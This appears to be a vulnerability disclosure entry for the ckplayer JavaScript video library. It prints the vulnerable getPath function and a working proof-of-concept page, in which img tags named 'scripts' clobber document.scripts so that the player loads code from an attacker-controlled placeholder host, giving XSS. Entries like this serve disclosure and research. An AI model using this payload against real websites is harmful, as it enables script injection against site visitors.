## ckplayer

### Meta

+ Library: ckplayer
+ Stars: 1.1K
+ Version: latest
+ Payload: ```<img name="scripts" src="https://xxx.xxx.xxx/js/"><img name="scripts" src="https://xxx.xxx.xxx/js/">```
+ Impact: XSS
+ CVE: N/A
+ Status: N/A
+ Foundby: TheHulk


### Library

URL: 
+ `https://gitee.com/niandeng/ckplayer`


### Vulnerable Code Snippet

```javascript
function getPath(siz) {
  var scriptList = document.scripts,
    thisPath = scriptList[scriptList.length - 1].src;
  for (var i = 0; i < scriptList.length; i++) {
    var scriptName = scriptList[i].getAttribute('name') || scriptList[i].getAttribute('data-name');
    var src = scriptList[i].src.slice(scriptList[i].src.lastIndexOf('/') + 1, scriptList[i].src.lastIndexOf('.'));
    if ((scriptName && (scriptName == 'ckplayer' || scriptName == 'ckplayer.min')) || (scriptList[i].src && (src == 'ckplayer' || src == 'ckplayer.min'))) {
      thisPath = scriptList[i].src;
      break;
    }
  }
  var path=thisPath.substring(0, thisPath.lastIndexOf('/js/') + 1);
  if(!isUndefined(siz)){
    path+=siz+'/';
  }
  return path;
}
```

### PoC
```html

<!--Library-->
<script>
<link type="text/css" rel="stylesheet" href="ckplayer/css/ckplayer.css" />
<script type="text/javascript" src="ckplayer/js/ckplayer.js" charset="UTF-8"></script>
<div class="video" style="width: 600px;height: 400px;">播放器容器</div>
<script type="text/javascript">
    var videoObject = {
        language: 'en',
        container: '.video',
        video: 'https://fake-server/no.mp4'
    };
    var player = new ckplayer(videoObject);
</script>
</script>
<!--Library-->

<!--Payload-->
<img name="scripts" src="https://xxx.xxx.xxx/js/">
<img name="scripts" src="https://xxx.xxx.xxx/js/">
<!--Payload-->
```